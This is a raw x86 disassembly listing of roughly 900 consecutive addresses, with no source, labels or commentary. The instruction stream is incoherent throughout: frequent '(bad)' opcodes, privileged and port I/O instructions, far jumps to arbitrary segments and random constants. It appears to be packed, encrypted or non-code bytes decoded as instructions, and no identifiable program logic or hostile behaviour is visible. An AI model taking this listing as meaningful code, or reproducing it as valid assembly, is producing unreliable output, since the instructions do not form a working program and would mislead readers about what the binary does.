  406c50:	xchg   edx,eax
  406c51:	jp     0x406cb7
  406c53:	mov    cx,0x33f0
  406c57:	adc    al,0x99
  406c59:	lods   eax,DWORD PTR ds:[esi]
  406c5a:	fwait
  406c5b:	(bad)  
  406c5c:	push   0xffffffe7
  406c5e:	pop    ds
  406c5f:	pusha  
  406c60:	aam    0x56
  406c62:	push   esi
  406c63:	mov    ah,BYTE PTR [eax]
  406c65:	and    dl,ah
  406c67:	fsub   DWORD PTR [ebp+ebp*2-0x49]
  406c6b:	daa    
  406c6c:	adc    esp,DWORD PTR [ebp+0x102c7a22]
  406c72:	(bad)  
  406c73:	(bad)  
  406c74:	(bad)  
  406c75:	test   al,0x10
  406c77:	jmp    0x406c75
  406c79:	imul   DWORD PTR [edx]
  406c7b:	dec    BYTE PTR [ecx]
  406c7d:	and    ecx,DWORD PTR [edi-0x7b]
  406c80:	(bad)  
  406c81:	pop    ds
  406c82:	mov    dh,0x4e
  406c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c85:	and    ah,BYTE PTR [eax]
  406c87:	ds mov cr6,esp
  406c8b:	scas   eax,DWORD PTR es:[edi]
  406c8c:	(bad)  
  406c8d:	push   ecx
  406c8e:	push   ebx
  406c8f:	mov    ch,0x84
  406c91:	mov    ecx,0x7368c02b
  406c96:	cli    
  406c97:	out    dx,al
  406c98:	outs   dx,DWORD PTR ds:[esi]
  406c99:	jmp    0x18d3:0x68de9c95
  406ca0:	sub    DWORD PTR [esi],0x17c24b40
  406ca6:	dec    eax
  406ca7:	mov    ds:0x14c173de,al
  406cac:	rcr    dl,1
  406cae:	sbb    al,0x45
  406cb0:	data16 and al,0xfb
  406cb3:	js     0x406c57
  406cb5:	bound  esp,QWORD PTR [ebp+0x6455ad72]
  406cbb:	dec    ebx
  406cbc:	inc    esp
  406cbd:	add    eax,eax
  406cbf:	cmc    
  406cc0:	nop
  406cc1:	mov    eax,gs:0xbdcb23d3
  406cc7:	scas   al,BYTE PTR es:[edi]
  406cc8:	sbb    al,0xc3
  406cca:	xor    edi,DWORD PTR [ebp-0x7f49b8b7]
  406cd0:	cld    
  406cd1:	push   eax
  406cd2:	lods   al,BYTE PTR ds:[esi]
  406cd3:	pop    ebx
  406cd4:	pop    ebp
  406cd5:	push   ebx
  406cd6:	push   esp
  406cd7:	add    al,0x34
  406cd9:	jl     0x406c8e
  406cdb:	xchg   DWORD PTR [edi+0x6cde82c2],edi
  406ce1:	mov    esp,0x206041ba
  406ce6:	leave  
  406ce7:	sub    esi,edi
  406ce9:	or     ecx,DWORD PTR [ecx+0x28]
  406cec:	lods   eax,DWORD PTR ds:[esi]
  406ced:	imul   esi,DWORD PTR [edx-0x236247c4],0xffffffe8
  406cf4:	(bad)  
  406cf5:	mov    eax,0x2b780bcd
  406cfa:	xchg   esp,eax
  406cfb:	and    ebx,DWORD PTR [edi+0x70]
  406cfe:	into   
  406cff:	sahf   
  406d00:	or     BYTE PTR [eax+0xd024f26],cl
  406d06:	ins    DWORD PTR es:[edi],dx
  406d07:	lods   al,BYTE PTR ds:[esi]
  406d08:	sahf   
  406d09:	xchg   esp,eax
  406d0a:	imul   ebx,DWORD PTR [ebp+0x19],0xb
  406d0e:	sti    
  406d0f:	mov    bl,0x26
  406d11:	outs   dx,BYTE PTR ds:[esi]
  406d12:	scas   eax,DWORD PTR es:[edi]
  406d13:	or     al,0xba
  406d15:	xor    eax,0x1fb23235
  406d1a:	scas   eax,DWORD PTR es:[edi]
  406d1b:	in     al,dx
  406d1c:	jb     0x406d1f
  406d1e:	in     al,dx
  406d1f:	pop    es
  406d20:	add    dh,al
  406d22:	dec    eax
  406d23:	mov    ds:0x7e498d3e,eax
  406d28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d29:	sbb    bh,al
  406d2b:	loopne 0x406d7d
  406d2d:	xchg   BYTE PTR [eax+0x76349ece],bl
  406d33:	cmc    
  406d34:	sub    ch,dh
  406d36:	mov    bh,0x18
  406d38:	adc    eax,DWORD PTR [eax-0x15]
  406d3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d3c:	mov    al,ds:0x2312a34d
  406d41:	aam    0x0
  406d43:	xor    eax,0x55b857f2
  406d48:	mov    edi,DWORD PTR [ebx+0x21de2557]
  406d4e:	inc    edi
  406d4f:	retf   
  406d50:	mov    al,0xb1
  406d52:	sub    eax,DWORD PTR [esi-0x294a8461]
  406d58:	mov    al,ds:0x61738fab
  406d5d:	gs stc 
  406d5f:	loopne 0x406dd1
  406d61:	lods   al,BYTE PTR ds:[esi]
  406d62:	push   ecx
  406d63:	or     ch,BYTE PTR [edx]
  406d65:	(bad)  
  406d66:	int    0xb9
  406d68:	or     cl,BYTE PTR [edi+0x68]
  406d6b:	out    0x25,eax
  406d6d:	or     DWORD PTR [edi],0xeb1ae96e
  406d73:	push   0x4a
  406d75:	ret    
  406d76:	and    eax,0x2d
  406d79:	enter  0x486e,0x56
  406d7d:	push   ss
  406d7e:	cmp    BYTE PTR [ebx+0x0],dh
  406d81:	jl     0x406d3e
  406d83:	ds pop edx
  406d85:	push   esp
  406d86:	pusha  
  406d87:	sub    al,0x5e
  406d89:	std    
  406d8a:	sub    DWORD PTR [ebp-0x2339a905],0xed13bb0f
  406d94:	out    0x53,eax
  406d96:	hlt    
  406d97:	mov    esp,0xfe1a689d
  406d9c:	repnz test eax,0x1f5986af
  406da2:	mov    ebp,0x6438b381
  406da7:	adc    ecx,DWORD PTR [ebx+0x54]
  406daa:	jmp    0x3570:0xb591b1e6
  406db1:	mov    DWORD PTR [eax+ebp*4],esi
  406db4:	dec    eax
  406db5:	pop    eax
  406db6:	sub    esi,ecx
  406db8:	push   ebp
  406db9:	icebp  
  406dba:	test   BYTE PTR [ecx],0x9f
  406dbd:	fdiv   QWORD PTR ds:0x250987e4
  406dc3:	sbb    bl,BYTE PTR [ebp+0x1ade180b]
  406dc9:	cmp    dl,BYTE PTR [ebx]
  406dcb:	xchg   ecx,eax
  406dcc:	xchg   esi,eax
  406dcd:	pop    ebx
  406dce:	dec    eax
  406dcf:	call   0x5436:0x1192e06f
  406dd6:	test   al,0xf4
  406dd8:	call   0x8158460
  406ddd:	retf   
  406dde:	mov    WORD PTR [esi],ss
  406de0:	daa    
  406de1:	stc    
  406de2:	xchg   edx,eax
  406de3:	pusha  
  406de4:	sub    ah,BYTE PTR fs:[ebp-0x5127f9c6]
  406deb:	iret   
  406dec:	sbb    esi,DWORD PTR [esi]
  406dee:	shr    dh,1
  406df0:	inc    esi
  406df1:	push   ebp
  406df2:	dec    esp
  406df3:	pop    ebx
  406df4:	push   edx
  406df5:	mov    ds:0xc14d8db3,eax
  406dfa:	int    0xa
  406dfc:	mov    edx,0xbae7f22c
  406e01:	fldenv [esi-0x6b]
  406e04:	and    BYTE PTR [ebx-0x6fb82beb],dl
  406e0a:	fnstenv [edi-0x7f]
  406e0d:	cmp    eax,0xf21bef85
  406e12:	aad    0x98
  406e14:	push   ebp
  406e15:	fwait
  406e16:	dec    ebp
  406e17:	lods   eax,DWORD PTR ds:[esi]
  406e18:	xor    al,0xdf
  406e1a:	pusha  
  406e1b:	inc    ecx
  406e1c:	and    DWORD PTR ds:0x54dbf7f6,esi
  406e22:	sub    ch,BYTE PTR ds:0x94626c1a
  406e28:	mov    DWORD PTR [esi],edi
  406e2a:	in     al,dx
  406e2b:	push   edi
  406e2c:	push   esp
  406e2d:	fsubr  DWORD PTR [edx]
  406e2f:	cmp    BYTE PTR [ebx+edx*2+0x537c7327],dl
  406e36:	jecxz  0x406dd0
  406e38:	and    al,0x1
  406e3a:	in     eax,0x1e
  406e3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e3d:	xchg   edx,eax
  406e3e:	pop    eax
  406e3f:	ja     0x406e74
  406e41:	stos   BYTE PTR es:[edi],al
  406e42:	mov    ?,WORD PTR [ecx-0x31]
  406e45:	lods   eax,DWORD PTR ds:[esi]
  406e46:	lock sub esp,DWORD PTR [ecx+0x632903f4]
  406e4d:	dec    ebp
  406e4e:	rcr    DWORD PTR [edx+0x1c],cl
  406e51:	mov    dh,0xa1
  406e53:	push   ebp
  406e54:	xchg   esi,eax
  406e55:	and    ax,0x6ea3
  406e59:	adc    al,0x6c
  406e5b:	or     BYTE PTR [ebp+edi*2+0x56dca489],al
  406e62:	mov    eax,0xdab5567a
  406e67:	mov    edi,0x7fa2aa1d
  406e6c:	mov    ss,WORD PTR [ecx+0x5b]
  406e6f:	mov    edi,0x8f386e95
  406e74:	int    0xc
  406e76:	popa   
  406e77:	scas   eax,DWORD PTR es:[edi]
  406e78:	push   eax
  406e79:	aam    0x73
  406e7b:	xor    edx,DWORD PTR [ebx+ebp*4+0x6f]
  406e7f:	out    dx,eax
  406e80:	or     bl,BYTE PTR [esi-0x5991ecab]
  406e86:	lds    esi,FWORD PTR [esp+edi*4-0x5c87a92d]
  406e8d:	retf   
  406e8e:	fldcw  WORD PTR [eax+0x5213c49b]
  406e94:	shl    DWORD PTR [edi-0x61],cl
  406e97:	jae    0x406f11
  406e99:	cdq    
  406e9a:	in     al,dx
  406e9b:	loop   0x406e6a
  406e9d:	data16 and ah,BYTE PTR [eax-0x62]
  406ea1:	dec    ebp
  406ea2:	mov    eax,0xefd4861
  406ea7:	pop    es
  406ea8:	std    
  406ea9:	dec    esp
  406eaa:	add    ah,BYTE PTR [eax+esi*2+0x41]
  406eae:	in     eax,0x47
  406eb0:	retf   
  406eb1:	inc    edx
  406eb2:	ret    
  406eb3:	lahf   
  406eb4:	add    edx,DWORD PTR [esi-0x8]
  406eb7:	mov    ebx,DWORD PTR [ebx]
  406eb9:	pop    ss
  406eba:	js     0x406e64
  406ebc:	mov    edx,0x7b66c339
  406ec2:	or     eax,0x34975c13
  406ec7:	lahf   
  406ec8:	leave  
  406ec9:	call   0x6793:0xaa37fe0
  406ed0:	ret    0x5743
  406ed3:	mov    ebx,0x4ed6814e
  406ed8:	sbb    DWORD PTR ds:0x71b772d9,ebp
  406ede:	mov    WORD PTR [edx+ebp*8],?
  406ee1:	fs pop ss
  406ee3:	or     dl,ah
  406ee5:	or     DWORD PTR [eax-0x4781e859],edi
  406eeb:	or     BYTE PTR [edi],dl
  406eed:	jecxz  0x406f43
  406eef:	xchg   dh,bl
  406ef1:	push   esi
  406ef2:	adc    DWORD PTR [ebx+esi*8+0x6c61e5d3],ecx
  406ef9:	call   DWORD PTR [eax+ecx*4+0x7a]
  406efd:	or     esi,0x3616a018
  406f03:	xchg   cl,bh
  406f05:	je     0x406ea5
  406f07:	add    al,0x13
  406f09:	icebp  
  406f0a:	enter  0x12e2,0x60
  406f0e:	mov    eax,0x5543c380
  406f13:	adc    eax,0x3a119b5e
  406f18:	fst    DWORD PTR [ebx]
  406f1a:	adc    al,0xad
  406f1c:	and    ebx,DWORD PTR [eax+0x1b]
  406f1f:	sub    eax,0x6a730237
  406f24:	xchg   ebx,eax
  406f25:	dec    esi
  406f26:	and    BYTE PTR [esi-0xc90a2cb],0xf3
  406f2d:	div    DWORD PTR [edi+0x454e86b]
  406f33:	ds stc 
  406f35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f36:	sub    eax,DWORD PTR [ebp+0x7ed6c77e]
  406f3c:	inc    esp
  406f3d:	popa   
  406f3e:	and    BYTE PTR [eax+ebx*1+0x7b15e59e],dh
  406f45:	mov    WORD PTR [esi*4+0x3678ec50],fs
  406f4c:	adc    ah,BYTE PTR [ebx-0x55]
  406f4f:	mov    ds:0x9970e3da,eax
  406f54:	enter  0x149e,0xa2
  406f58:	jno    0x406f5b
  406f5a:	dec    edx
  406f5b:	push   ds
  406f5c:	push   eax
  406f5d:	sbb    al,0x49
  406f5f:	sbb    dl,BYTE PTR [ecx+edi*1-0x73]
  406f63:	push   esi
  406f64:	push   0x22d38230
  406f69:	in     al,dx
  406f6a:	ins    BYTE PTR es:[edi],dx
  406f6b:	out    0x4f,eax
  406f6d:	push   ebp
  406f6e:	adc    BYTE PTR [edi+ebx*1],bl
  406f71:	or     eax,0x85232d49
  406f76:	xchg   ebp,eax
  406f77:	mov    DWORD PTR [ebx+edi*8-0x579b8dae],esp
  406f7e:	push   edi
  406f7f:	shl    DWORD PTR [edi+ebp*8-0x7aa15667],0x35
  406f87:	mov    ecx,esp
  406f89:	stc    
  406f8a:	cmp    BYTE PTR [ebx],ch
  406f8c:	ret    0x1b13
  406f8f:	mov    dh,0x7c
  406f91:	addr16 xchg ebx,eax
  406f93:	pushf  
  406f94:	xchg   ebp,eax
  406f95:	jg     0x406fbd
  406f97:	mov    ds:0x7ea65206,al
  406f9c:	and    BYTE PTR [edx+0x78],dh
  406f9f:	inc    DWORD PTR [edx]
  406fa1:	nop
  406fa2:	mov    al,0x51
  406fa4:	js     0x407000
  406fa6:	aaa    
  406fa7:	cmp    bl,BYTE PTR [edi]
  406fa9:	sbb    BYTE PTR [edi],ch
  406fab:	cli    
  406fac:	loop   0x406f8f
  406fae:	mov    ah,0xf1
  406fb0:	shl    eax,cl
  406fb2:	jb     0x406f83
  406fb4:	fldenv [edx-0x41]
  406fb7:	cmp    DWORD PTR [ecx-0x15282ef9],edx
  406fbd:	push   ecx
  406fbe:	scas   al,BYTE PTR es:[edi]
  406fbf:	add    al,0x4c
  406fc1:	repz or BYTE PTR [ecx+0x34],dh
  406fc5:	mov    fs,WORD PTR [eax-0x4f1eef26]
  406fcb:	push   ebx
  406fcc:	pop    ebp
  406fcd:	xchg   ebp,eax
  406fce:	outs   dx,DWORD PTR ds:[esi]
  406fcf:	dec    esp
  406fd0:	les    eax,FWORD PTR [ebx-0x3fb7b7f6]
  406fd6:	into   
  406fd7:	or     DWORD PTR [esi],0x5511b6fc
  406fdd:	pushf  
  406fde:	lods   eax,DWORD PTR ds:[esi]
  406fdf:	jg     0x406fd3
  406fe1:	push   ss
  406fe2:	mov    ebx,0x1fb01a54
  406fe7:	and    ah,BYTE PTR [edi+edx*4]
  406fea:	lds    eax,FWORD PTR [edi]
  406fec:	xor    BYTE PTR [edx-0x22],0xdf
  406ff0:	arpl   WORD PTR [ebx+0x521045c8],dx
  406ff6:	jbe    0x407013
  406ff8:	dec    ebp
  406ff9:	pop    ebx
  406ffa:	xor    esp,esi
  406ffc:	push   ss
  406ffd:	xlat   BYTE PTR ds:[ebx]
  406ffe:	popa   
  406fff:	xchg   BYTE PTR [esi-0x2285dac6],ch
  407005:	jno    0x407063
  407007:	add    BYTE PTR [ebp-0x2af43ff],0x24
  40700e:	sti    
  40700f:	xchg   edi,eax
  407010:	clc    
  407011:	mov    ds:0x9cf77a7a,al
  407016:	test   BYTE PTR [ebx],al
  407018:	ja     0x40707f
  40701a:	mov    bl,0x13
  40701d:	xchg   esp,eax
  40701e:	sar    DWORD PTR [ebx],1
  407020:	mov    ebp,0xe5052790
  407025:	not    BYTE PTR [edx+eiz*8+0x5d]
  407029:	and    eax,0xe695c7df
  40702e:	test   DWORD PTR [edi+0xbcdb2f9],ebp
  407034:	or     BYTE PTR [ecx],ch
  407036:	fwait
  407037:	xchg   ecx,eax
  407038:	dec    ecx
  407039:	inc    edi
  40703a:	adc    BYTE PTR [eax+0x76],ch
  40703d:	pop    DWORD PTR [edx]
  40703f:	inc    ebx
  407040:	mov    ds:0x83b9fb98,al
  407045:	add    eax,0x905c305e
  40704a:	(bad)  
  40704b:	fidiv  WORD PTR [ecx]
  40704d:	or     DWORD PTR [edx-0x78],0xffffff8d
  407051:	and    bh,BYTE PTR [ebp+edi*1-0x358943d1]
  407058:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407059:	jecxz  0x40703f
  40705b:	push   edx
  40705c:	mov    ds:0x52ca1617,al
  407061:	or     bl,0x45
  407064:	imul   ebx,edi,0x47
  407067:	cmc    
  407068:	inc    esi
  407069:	rcr    DWORD PTR [edx+ebx*8+0x49847bd9],cl
  407070:	jne    0x4070e5
  407072:	daa    
  407073:	mov    bh,0x39
  407075:	stos   BYTE PTR es:[edi],al
  407076:	or     esp,edx
  407078:	gs sti 
  40707a:	pop    ds
  40707b:	arpl   WORD PTR [edx+0x73],bp
  40707e:	jb     0x4070b5
  407080:	aad    0xfb
  407082:	dec    esi
  407083:	data16 mov bl,0x63
  407086:	xor    cl,BYTE PTR ds:0x16a75472
  40708c:	int    0xd3
  40708e:	(bad)  
  40708f:	dec    ebx
  407090:	push   es
  407091:	sti    
  407092:	fdivr  DWORD PTR [ebp+0x7d17f683]
  407098:	dec    esp
  407099:	cmp    al,0x7
  40709b:	inc    edx
  40709c:	int    0xcf
  40709e:	cli    
  40709f:	clc    
  4070a0:	jmp    0x407082
  4070a2:	aad    0xd2
  4070a4:	(bad)  
  4070a5:	loopne 0x40707a
  4070a7:	lock repnz loop 0x407053
  4070ab:	out    0xa,al
  4070ad:	les    edi,FWORD PTR [esp+eax*4+0x7b62c141]
  4070b4:	out    0x2e,al
  4070b6:	add    eax,0xde04480
  4070bb:	xchg   ecx,eax
  4070bc:	ja     0x40708a
  4070be:	cld    
  4070bf:	daa    
  4070c0:	mov    edi,0x3f6a4e56
  4070c5:	and    dl,bl
  4070c7:	outs   dx,BYTE PTR ds:[esi]
  4070c8:	push   edi
  4070c9:	inc    esp
  4070ca:	sbb    eax,0x5d71b295
  4070cf:	mov    al,ds:0x4f28969a
  4070d4:	pop    esi
  4070d5:	mov    cl,0xa7
  4070d7:	mov    bl,0xb9
  4070d9:	ds mov ah,0xa0
  4070dc:	xor    eax,0xa889e322
  4070e1:	push   esp
  4070e2:	and    bh,0xf0
  4070e5:	xlat   BYTE PTR ds:[ebx]
  4070e6:	xor    al,0x3d
  4070e8:	leave  
  4070e9:	and    esi,esi
  4070eb:	inc    eax
  4070ec:	dec    eax
  4070ed:	lods   eax,DWORD PTR ds:[esi]
  4070ee:	xlat   BYTE PTR gs:[ebx]
  4070f0:	scas   eax,DWORD PTR es:[edi]
  4070f1:	into   
  4070f2:	push   es
  4070f3:	fstp   st(3)
  4070f5:	push   edx
  4070f6:	xchg   esp,eax
  4070f7:	mov    ss,WORD PTR [edi-0x6ae5950d]
  4070fd:	pop    es
  4070fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070ff:	adc    al,0xb3
  407101:	lods   eax,DWORD PTR ds:[esi]
  407102:	bound  eax,QWORD PTR [edx+0x39]
  407105:	fmulp  st(5),st
  407107:	fs cmp eax,0xaba5c3d5
  40710d:	mov    ecx,0x17cb4ab2
  407112:	pop    edi
  407113:	dec    edi
  407114:	dec    eax
  407115:	dec    eax
  407116:	jge    0x40709b
  407118:	jbe    0x407193
  40711a:	stc    
  40711b:	je     0x4070b5
  40711d:	sub    dh,dh
  40711f:	adc    BYTE PTR [eax],bh
  407121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407122:	outs   dx,DWORD PTR ds:[esi]
  407123:	sbb    dl,BYTE PTR [eax+eiz*1-0x6e6a8190]
  40712a:	bound  edx,QWORD PTR [ecx-0x44]
  40712d:	sub    DWORD PTR [ebx],edx
  40712f:	push   0x31c24699
  407134:	pop    ds
  407135:	jl     0x407197
  407137:	sub    BYTE PTR [esi],ah
  407139:	or     DWORD PTR ds:0x5d29676d,edx
  40713f:	test   DWORD PTR [edx],esi
  407141:	(bad)  
  407142:	jbe    0x40716d
  407144:	sub    al,0xc3
  407146:	je     0x4070e0
  407148:	push   ecx
  407149:	jle    0x40717e
  40714b:	stos   BYTE PTR es:[edi],al
  40714c:	jg     0x407144
  40714e:	and    al,0x3f
  407150:	fild   QWORD PTR [esi+0x30]
  407153:	retf   
  407154:	das    
  407155:	dec    eax
  407156:	pop    edi
  407157:	push   es
  407158:	out    dx,al
  407159:	and    eax,0x88731469
  40715e:	mov    al,0x18
  407160:	cmp    bl,ah
  407162:	ins    BYTE PTR es:[edi],dx
  407163:	in     eax,dx
  407164:	pop    edx
  407165:	mov    ds:0xa8598492,al
  40716a:	and    eax,0xb015def0
  40716f:	or     al,0xd2
  407171:	fstp   TBYTE PTR [ebx]
  407173:	sub    bl,al
  407175:	daa    
  407176:	ror    BYTE PTR [ecx],cl
  407178:	out    0x83,eax
  40717a:	test   BYTE PTR [eax-0x7df5c221],0xa4
  407181:	mov    BYTE PTR ds:0xd02bf00a,al
  407187:	mov    esi,0x7cea10a5
  40718c:	add    DWORD PTR [ecx+0x21846806],esi
  407192:	mov    esp,0xe0c19046
  407197:	out    dx,al
  407198:	out    dx,eax
  407199:	pop    edx
  40719a:	push   ds
  40719b:	jne    0x4071b5
  40719d:	push   0x5137d1a1
  4071a2:	outs   dx,BYTE PTR ds:[esi]
  4071a3:	leave  
  4071a4:	in     al,dx
  4071a5:	sub    al,0xbe
  4071a7:	ja     0x40720d
  4071a9:	nop
  4071aa:	sbb    DWORD PTR [ebx+ecx*4+0x6f],ebx
  4071ae:	int3   
  4071af:	in     al,0xde
  4071b1:	repnz push es
  4071b3:	daa    
  4071b4:	outs   dx,DWORD PTR ds:[esi]
  4071b5:	mov    ah,0x83
  4071b7:	scas   al,BYTE PTR es:[edi]
  4071b8:	pop    ecx
  4071b9:	(bad)  
  4071ba:	out    dx,al
  4071bb:	fimul  DWORD PTR gs:[ebp-0x26990dd2]
  4071c2:	inc    ebx
  4071c3:	pusha  
  4071c4:	test   DWORD PTR [ebx-0x16aa57e8],esi
  4071ca:	fs icebp 
  4071cc:	cs icebp 
  4071ce:	imul   ebp,DWORD PTR ds:0xc2514aec,0xe3ff2938
  4071d8:	icebp  
  4071d9:	test   eax,0x11c6ca9b
  4071de:	inc    eax
  4071df:	cdq    
  4071e0:	and    eax,0xc92b3052
  4071e5:	retf   
  4071e6:	mov    dl,0x3e
  4071e8:	fstp   DWORD PTR cs:[edx+0x6d8457d7]
  4071ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071f0:	cs pusha 
  4071f2:	call   0xdb803648
  4071f7:	add    ebx,esi
  4071f9:	or     BYTE PTR [esi],0xcd
  4071fc:	xor    DWORD PTR [bx+si-0x1615],edx
  407201:	xchg   DWORD PTR [ebx+0x41],edi
  407204:	add    bl,ah
  407206:	leave  
  407207:	jb     0x4071ea
  407209:	xchg   ecx,eax
  40720a:	adc    BYTE PTR [esi+ebx*8-0x1e],0xc1
  40720f:	dec    esi
  407210:	inc    eax
  407211:	sbb    eax,0xc0518bd2
  407216:	dec    edx
  407217:	ficom  DWORD PTR [edi+0xf2eb4b0]
  40721d:	jmp    0x3fe0a086
  407222:	repnz das 
  407224:	cwde   
  407225:	aam    0x2b
  407227:	fadd   st,st(0)
  407229:	xchg   esp,eax
  40722a:	arpl   cx,si
  40722c:	dec    DWORD PTR [ebx+0x2c11080c]
  407232:	(bad)  
  407233:	adc    eax,DWORD PTR [edi-0x52]
  407236:	cdq    
  407237:	push   ebx
  407238:	inc    esi
  407239:	jo     0x407207
  40723b:	xor    ch,BYTE PTR [ecx-0x4]
  40723e:	ds add al,0xf6
  407241:	repnz or cl,BYTE PTR [edx]
  407244:	push   esi
  407245:	out    0x35,eax
  407247:	adc    DWORD PTR [ebx+0x22398150],eax
  40724d:	int    0x8b
  40724f:	je     0x4071dc
  407251:	sbb    ebp,0x56a65c64
  407257:	mov    ecx,0x4b4b90fc
  40725c:	push   cs
  40725d:	fld    QWORD PTR [ebx]
  40725f:	xor    dh,BYTE PTR [ebp+0x36361df2]
  407265:	mov    BYTE PTR [ecx],al
  407267:	mov    ebx,0xb4a38787
  40726c:	jmp    0xf59a:0x541db817
  407273:	mov    bl,0xa9
  407275:	adc    al,0xb9
  407277:	push   esp
  407278:	dec    edx
  407279:	mov    bl,0xfd
  40727b:	(bad)  
  40727c:	stc    
  40727d:	pushf  
  40727e:	xchg   edi,eax
  40727f:	push   es
  407280:	xchg   DWORD PTR [edx],eax
  407282:	adc    ch,dl
  407284:	cs or  eax,0x10945078
  40728a:	in     eax,0x6e
  40728c:	dec    edi
  40728d:	test   DWORD PTR [ecx],esi
  40728f:	(bad)  
  407290:	jge    0x407239
  407292:	jo     0x4072bd
  407294:	mov    DWORD PTR [edi],edi
  407296:	jne    0x407309
  407298:	xor    ebp,ecx
  40729a:	xor    esi,DWORD PTR [ecx-0x6c]
  40729d:	sbb    eax,0xddae9a6
  4072a2:	sbb    DWORD PTR [edx+ecx*4-0x62],esp
  4072a6:	adc    esi,DWORD PTR ds:0x68ab1cd3
  4072ac:	int3   
  4072ad:	loope  0x40731d
  4072af:	adc    bh,BYTE PTR [eax+0xe2d9ab3]
  4072b5:	cmp    DWORD PTR [ebx],edi
  4072b7:	jno    0x407281
  4072b9:	xor    eax,0xf48ff916
  4072be:	xor    al,0xd5
  4072c0:	xor    ecx,DWORD PTR [ebx+0x20]
  4072c3:	and    edx,ebx
  4072c5:	mov    dl,0x8b
  4072c7:	mov    bh,0xd9
  4072c9:	rcl    BYTE PTR [eax*1-0x293a4415],1
  4072d0:	push   ds
  4072d1:	leave  
  4072d2:	cli    
  4072d3:	ds mov esi,0x55db0138
  4072d9:	lock ret 0xf07
  4072dd:	(bad)  
  4072de:	test   DWORD PTR [ebp+0xcadc7f1],0x7eca7b19
  4072e8:	ss sbb al,0xdf
  4072eb:	sbb    ecx,DWORD PTR [edx-0x41]
  4072ee:	repnz add edi,DWORD PTR [esi-0x767acb0d]
  4072f5:	(bad)  [ecx+0x3f]
  4072f8:	test   BYTE PTR [ecx-0x2e15d297],ah
  4072fe:	test   al,0xfe
  407300:	dec    ebp
  407301:	mov    ecx,0x808f25bd
  407306:	fild   WORD PTR [esi-0x1b]
  407309:	pop    edx
  40730a:	cmp    bl,dh
  40730c:	repnz retf 
  40730e:	jmp    DWORD PTR [eax+0x1d274f66]
  407314:	jg     0x4072f7
  407316:	mov    eax,ds:0x35fe7eb6
  40731b:	cmc    
  40731c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40731d:	and    eax,0xc7e00e90
  407322:	lds    eax,FWORD PTR [ecx]
  407324:	test   eax,0xf4e9039d
  407329:	pop    ebp
  40732a:	push   ebx
  40732b:	and    eax,0xdc0f3669
  407330:	pop    edx
  407331:	imul   bh
  407333:	add    dl,BYTE PTR [ecx-0x5a9b0999]
  407339:	xor    ecx,DWORD PTR [eax+edx*1-0x4b]
  40733d:	rcl    BYTE PTR [ecx-0x34],1
  407340:	jg     0x4072c6
  407342:	ret    
  407343:	ret    
  407344:	mov    bh,0x1e
  407346:	push   edi
  407347:	mov    esp,0xff1745d0
  40734c:	icebp  
  40734d:	sbb    edi,DWORD PTR [ebx+0x42b32134]
  407353:	retf   0xc225
  407356:	call   0x18995d05
  40735b:	adc    eax,0x91c79043
  407360:	lock (bad) 
  407362:	repnz call 0x58f4:0xc2c3a4a7
  40736a:	push   ebx
  40736b:	rcl    eax,cl
  40736d:	add    al,0xba
  40736f:	pusha  
  407370:	scas   al,BYTE PTR es:[edi]
  407371:	out    0x5a,al
  407373:	(bad)  
  407375:	inc    ebp
  407376:	out    dx,al
  407377:	mov    WORD PTR [eax+0x6a],es
  40737a:	lods   eax,DWORD PTR ds:[esi]
  40737b:	je     0x407385
  40737d:	rcr    DWORD PTR [edi-0x79],cl
  407380:	push   esp
  407381:	add    DWORD PTR [ecx+0x73],0x5c
  407385:	repnz push ebx
  407387:	sahf   
  407388:	or     dh,BYTE PTR [edi+0x36]
  40738b:	lods   al,BYTE PTR ds:[esi]
  40738c:	popa   
  40738d:	pop    ss
  40738e:	neg    dl
  407390:	add    eax,0xbcfdac2f
  407395:	xor    esi,ecx
  407397:	fisub  DWORD PTR [ecx+0x52]
  40739a:	shl    BYTE PTR [ebx-0x17],1
  40739d:	in     eax,dx
  40739e:	xchg   BYTE PTR [edx-0x7b],ch
  4073a1:	sahf   
  4073a2:	and    eax,0x965dec6b
  4073a7:	add    bl,BYTE PTR [ebx-0x59]
  4073aa:	ficomp DWORD PTR [ecx]
  4073ac:	fnstsw WORD PTR [esp+ebx*8-0x50259773]
  4073b3:	mov    bl,0x14
  4073b5:	(bad)  
  4073b6:	mul    ebx
  4073b8:	(bad)  [edi+0x1a57d8dc]
  4073be:	pop    ebp
  4073bf:	pop    ebx
  4073c0:	js     0x407417
  4073c2:	mov    ah,0x3e
  4073c4:	popa   
  4073c5:	sbb    eax,DWORD PTR [ecx]
  4073c7:	xchg   ecx,eax
  4073c8:	in     eax,dx
  4073c9:	aaa    
  4073ca:	adc    ebp,DWORD PTR [edi-0x7577803c]
  4073d0:	outs   dx,DWORD PTR ds:[esi]
  4073d1:	dec    ebp
  4073d2:	push   0x18
  4073d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073d5:	clc    
  4073d6:	cmp    BYTE PTR [edx-0x4b3bd6d9],al
  4073dc:	hlt    
  4073dd:	sbb    cl,BYTE PTR [ecx]
  4073df:	arpl   WORD PTR [eax+0xd],si
  4073e2:	cmp    ch,dl
  4073e4:	cmp    BYTE PTR [ecx+0x28651bff],0x1e
  4073eb:	in     eax,dx
  4073ec:	add    eax,DWORD PTR [ebp-0x71]
  4073ef:	pop    ebp
  4073f0:	add    eax,0x28f3435b
  4073f5:	mov    dh,0xd0
  4073f7:	inc    ecx
  4073f8:	push   esi
  4073f9:	jns    0x4073ee
  4073fb:	out    dx,al
  4073fc:	push   ebp
  4073fd:	sbb    DWORD PTR [ebx-0x68],ecx
  407400:	nop
  407401:	inc    esp
  407402:	dec    esp
  407403:	test   al,0x34
  407405:	(bad)  
  407406:	inc    ebx
  407407:	test   BYTE PTR [edi],bh
  407409:	xchg   esi,eax
  40740a:	or     al,0xd4
  40740c:	retf   0x39bd
  40740f:	xor    esi,DWORD PTR [ebp+0x6ca502e7]
  407415:	ja     0x4073f7
  407417:	xor    al,0xfe
  407419:	aaa    
